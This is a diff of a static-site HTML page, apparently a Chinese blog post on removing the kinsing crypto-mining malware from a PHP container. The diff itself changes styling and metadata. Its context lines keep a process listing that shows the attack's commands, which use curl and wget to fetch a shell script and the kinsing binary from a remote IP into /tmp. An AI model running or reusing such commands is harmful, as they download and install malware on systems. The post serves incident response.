@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   
-  <meta name="generator" content="Hugo 0.89.4" />
+  <meta name="generator" content="Hugo 0.113.0">
 
   
   <meta name="description" content="this is description">
@@ -145,13 +145,12 @@ pre code {
 }
 
 code {
-  padding: 0 0 0 3px;
+  padding: 2px 4px;
+  color: inherit; 
+  background-color: #f5f5f5;
+  border: 1px solid #ccc;
+  border-radius: 4px;
   font-size: .9em;
-}
-
-code a,
-code a:hover {
-  color: #999999;
 }
 
 
@@ -180,30 +179,7 @@ blockquote,
   
   <div class="container">
     <article>
-      <h1 style="margin:0 0 5px 0">解决 kinsing 挖矿恶意程序的攻击</h1>
-    
-    
-    <small class="text-secondary">2021-08-27</small>
-    
-
-<small><code><a href="https://kouler.com/tags/kinsing">#kinsing</a></code></small>
-
-
-<small><code><a href="https://kouler.com/tags/kdevtmpfsi">#kdevtmpfsi</a></code></small>
-
-
-<small><code><a href="https://kouler.com/tags/%E6%8C%96%E7%9F%BF">#挖矿</a></code></small>
-
-
-<small><code><a href="https://kouler.com/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F">#恶意程序</a></code></small>
-
-
-<small><code><a href="https://kouler.com/tags/%E6%BC%8F%E6%B4%9E">#漏洞</a></code></small>
-
-
-<small><code><a href="https://kouler.com/tags/php">#php</a></code></small>
-
-    <br><br>
+      <h1>解决 kinsing 挖矿恶意程序的攻击</h1>
 <h2 id="环境">环境</h2>
 <ul>
 <li>基于 php7.4.12 的容器</li>
@@ -249,7 +225,7 @@ root        11  0.0  0.0   5504   880 ?        Ss   Jan29   1:18 /usr/sbin/cron
 root     10749  0.0  0.1  80588 14492 ?        S    20:17   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
 www-data 10750  0.0  0.1  86932 15836 ?        S    20:17   0:00 php-fpm: pool www
 www-data 10751  0.0  0.2  88984 17796 ?        S    20:17   0:00 php-fpm: pool www
-www-data 11671  0.0  0.0   2380   652 ?        S    20:57   0:00 sh -c [ -f &quot;/bin/bash&quot; ] &amp;&amp; (curl -s http://194.38.20.199/ph.sh||wget -q -
+www-data 11671  0.0  0.0   2380   652 ?        S    20:57   0:00 sh -c [ -f &#34;/bin/bash&#34; ] &amp;&amp; (curl -s http://194.38.20.199/ph.sh||wget -q -
 www-data 11673  0.0  0.0   3992  1880 ?        S    20:57   0:00 bash
 www-data 11765  0.1  0.0  23096  4832 ?        S    20:57   0:00 curl -o /tmp/kinsing http://194.38.20.199/kinsing
 root     11785  0.0  0.0   7632  1412 ?        R+   20:59   0:00 ps aux
